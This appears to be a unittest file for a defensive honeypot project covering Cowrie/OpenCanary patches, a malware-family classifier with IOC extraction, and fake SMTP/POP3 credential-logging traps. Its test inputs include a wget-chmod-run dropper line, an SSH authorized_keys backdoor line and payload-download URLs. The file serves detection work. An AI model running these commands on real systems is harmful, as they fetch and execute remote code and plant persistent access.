# The honeypot side: patches for Cowrie/OpenCanary, hp-fileinfo's static analysis and hp-traps' fake services.
import asyncio, importlib.machinery, importlib.util, json, os, shutil, struct, tempfile, unittest

from tests.helpers import ROOT

import patches  # noqa: E402  (honeypot/ is on sys.path)


def load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, path)
    spec = importlib.util.spec_from_loader(name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


fileinfo = load("hp_fileinfo", os.path.join(ROOT, "honeypot", "hp-fileinfo"))


class Patches(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.d)

    def write(self, name, text):
        p = os.path.join(self.d, name)
        open(p, "w").write(text)
        return p

    def test_free_patch_once(self):
        p = self.write("free.py", "class X:\n    def m(self):\n" + patches.FREE_OLD + "\n                    pass\n" + patches.FREE_OLD2 + "\n")
        self.assertEqual(patches.cowrie_free(p), 0)
        self.assertIn("Huginn patch", open(p).read())
        self.assertTrue(os.path.exists(p + ".orig"))
        self.assertEqual(patches.cowrie_free(p), 3)

    def test_free_upstream_changed(self):
        p = self.write("free.py", "something else\n")
        self.assertEqual(patches.cowrie_free(p), 1)
        self.assertEqual(open(p).read(), "something else\n")

    def test_opencanary_ports(self):
        p = self.write("c.json", json.dumps({"http.enabled": True, "http.port": 8080, "httpproxy.enabled": False, "httpproxy.port": 8080,
                                             "ftp.enabled": False, "ftp.port": 21}))
        self.assertEqual(patches.opencanary_ports(p), 0)
        with open(p) as fh:
            c = json.load(fh)
        self.assertEqual(c["http.port"], 8080)
        self.assertGreaterEqual(c["httpproxy.port"], 62000)
        self.assertEqual(c["ftp.port"], 21)
        self.assertEqual(patches.opencanary_ports(p), 3)


class FileInfo(unittest.TestCase):
    def elf(self, bits, endian, machine):
        e = "<" if endian == "little" else ">"
        return b"\x7fELF" + bytes([2 if bits == 64 else 1, 1 if endian == "little" else 2]) + b"\x00" * 12 + struct.pack(e + "H", machine) + b"\x00" * 40

    def test_classify(self):
        self.assertEqual(fileinfo.classify(self.elf(64, "little", 62)), ("ELF 64-bit", "x86-64"))
        self.assertEqual(fileinfo.classify(self.elf(32, "little", 40)), ("ELF 32-bit", "arm"))
        self.assertEqual(fileinfo.classify(self.elf(32, "big", 8)), ("ELF 32-bit", "mips"))
        self.assertEqual(fileinfo.classify(self.elf(32, "little", 8))[1], "mipsel")
        self.assertEqual(fileinfo.classify(b"#!/bin/sh\nwget x\n")[0], "script (/bin/sh)")
        self.assertEqual(fileinfo.classify(b"\x1f\x8b\x08")[0], "gzip")

    def test_families(self):
        self.assertEqual(fileinfo.family(b"\x7fELF....xmrig....donate-level"), "XMRig (Monero miner)")
        self.assertEqual(fileinfo.family(b"\x7fELF..GETLOCALIP..HOLD"), "Gafgyt / Bashlite")
        self.assertEqual(fileinfo.family(b"\x7fELF../dev/watchdog..TSource Engine Query"), "Mirai")
        self.assertEqual(fileinfo.family(b"#!/bin/sh\ncd /tmp; wget http://x/a; chmod 777 a; ./a"), "Dropper script")
        self.assertEqual(fileinfo.family(b"echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys"), "SSH key backdoor")
        self.assertEqual(fileinfo.family(b"nothing interesting here"), "")

    def test_iocs(self):
        out = fileinfo.iocs(b"wget http://8.8.4.4/bins/mips; 10.0.0.1 1.2.3.4:4444 http://example.com/a.sh.")
        self.assertIn("http://8.8.4.4/bins/mips", out)
        self.assertIn("1.2.3.4:4444", out)
        self.assertIn("http://example.com/a.sh", out)
        self.assertNotIn("10.0.0.1", out)
        self.assertNotIn("8.8.4.4", out)      # already part of a URL


class Traps(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        os.environ["LOGS_DIRECTORY"] = self.d
        self.t = load("hp_traps", os.path.join(ROOT, "honeypot", "hp-traps.py"))

    def tearDown(self):
        shutil.rmtree(self.d)

    def events(self):
        out = []
        for f in os.listdir(self.d):
            with open(os.path.join(self.d, f)) as fh:
                out += [json.loads(l) for l in fh]
        return out

    def talk(self, service, lines, expect_close=True):
        async def run():
            srv = await asyncio.start_server(self.t.make(service), "127.0.0.1", 0)
            port = srv.sockets[0].getsockname()[1]
            r, w = await asyncio.open_connection("127.0.0.1", port)
            got = [await asyncio.wait_for(r.readline(), 5)]
            for l in lines:
                w.write(l)
                await w.drain()
                got.append(await asyncio.wait_for(r.readline(), 5))
            w.close()
            srv.close()
            await srv.wait_closed()
            await asyncio.sleep(0.1)
            return [g.decode("utf-8", "replace") for g in got]
        return asyncio.run(run())

    def test_smtp_auth_logged(self):
        import base64
        cred = base64.b64encode(b"\x00user@example.com\x00hunter2").decode()
        got = self.talk("smtp", [b"EHLO x\r\n"])
        self.assertTrue(got[0].startswith("220 "))
        got = self.talk("smtp", [b"HELO x\r\n", ("AUTH PLAIN %s\r\n" % cred).encode(), b"QUIT\r\n"])
        logins = [e for e in self.events() if e["event"] == "login"]
        self.assertEqual((logins[0]["username"], logins[0]["password"]), ("user@example.com", "hunter2"))
        self.assertEqual(logins[0]["src_ip"], "127.0.0.1")

    def test_pop3_login(self):
        got = self.talk("pop3", [b"USER bob\r\n", b"PASS secret\r\n"])
        self.assertTrue(got[0].startswith("+OK"))
        self.assertTrue(got[2].startswith("-ERR"))
        self.assertTrue(any(e["event"] == "login" and e["password"] == "secret" for e in self.events()))


if __name__ == "__main__":
    unittest.main()
